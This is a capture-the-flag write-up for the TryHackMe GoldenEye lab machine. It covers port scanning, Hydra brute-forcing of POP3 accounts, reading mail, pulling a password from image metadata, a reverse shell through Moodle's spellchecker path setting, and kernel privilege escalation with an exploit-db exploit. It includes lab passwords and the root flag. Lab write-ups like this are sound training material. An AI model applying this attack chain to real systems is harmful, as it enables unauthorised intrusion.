# writeups

`/sev-home/` : basic auth get

```
25/tcp   open     smtp          Postfix smtpd
80/tcp   open     http          Apache httpd 2.4.7 ((Ubuntu))
25/tcp    open  smtp     syn-ack Postfix smtpd
80/tcp    open  http     syn-ack Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 syn-ack Dovecot pop3d
55007/tcp open  pop3     syn-ack Dovecot pop3d

```

```
+ /splashAdmin.php: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24.
+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems 
which could not be tested remotely.
```

terminal.js==content==
```

Severnaya Auxiliary Control Station
****TOP SECRET ACCESS****
Accessing Server Identity

Server Name:....................
GOLDENEYE

//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```
I found the decoded password on cyberchef using the magic filter
```
From_HTML_Entity(InvincibleHack3r)
```
Natalya Boris, check hydra and bruteforce 1000 passwords with natalya,boris
I used rockyou.txt but nothing for a while, and I tried other like `/usr/share/wordlists/fasttrack.txt`,
and a few moments a found smthing 
```
[55007][pop3] host: 10.10.3.116   login: natalya   password: bird
```
but you can still found the same password, but you gonna take a while with rockyou.txt,
```
cat ~/myFiles/rockyou.txt | grep -n "^bird$"
82690:bird

```
the boris password
```
[55007][pop3] host: 10.10.3.116   login: boris   password: secret1!
```

i used netcat to connect through the pop3 services but you can do it with
telnet, the task expect you connect with telnet btw.
```
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO 
supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is 
being sought after by a crime syndicate named Janus.
.

RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me 
or boris know if you see any config issues, especially is it's related to security...
even if it's not, just enter it in under the guise of "security"...it'll get the change 
order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.
```
after that I login as xenia in the new adress, and I also i found some interesting hint
```
For any Questions message the admin of this service here. User: admin
```
I found a really important messages from the doctor doak, and I'm trying to login
as him in his account via hydra brutefore
```
[55007][pop3] host: 10.10.3.116   login: doak   password: goat
```
after i connected to his pop3 mail I read the 1st one and then I got
```
James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

```
so I connected and I go on message private files, and found the s3cret.txt, I downloaded it
and this file, gave me another feedack  to go through smthing so let's see what's that, really 
somthing hide in the metadata of the image, I got it with `exiftool`, it's a base64 maybe, and 
it was a base64, I got it with magicfilter on cyberChef
```
xWinter1995x!
```
maybe that the password for 007 user, no it's admin, and after that go through 
site administration, or
```
http://severnaya-station.com/gnocertdir/admin/settings.php?section=editorsettingstinymce
```
edit engine with `PSpellShell`, so better way to do it, go to the search bar below site admin
search spell, so right know the engine edit it, and the one that said aspell edit it with. after
go to profile>blog>view entries>add new>, then click on the toogle spellchecker and here the 
revShell. so here the shell we check the kernel version, and it seems vulnerable, we look for an exploit

```
https://www.exploit-db.com/raw/37292
```
and here th one we used with POC, but the only thing we change was the exploit expected to execute with
gcc but the machine don't have gcc, as a gcc alternatives we found `cc`, so we just change gcc to cc in the
exploit and execute again,with the same syntax for gcc and after that here the root

`568628e0d993b1973adc718237da6e93` the flag was hidden in the /root/.flag.txt


this writeups helped me when I was struggle

https://www.aldeid.com/wiki/TryHackMe-GoldenEye##2.2_-_If_those_creds_don%E2%80%99t_seem_to_work,_can_you_use_another_program_to_find_other_users_and_passwords?_Maybe_Hydra?Whats_their_new_password?
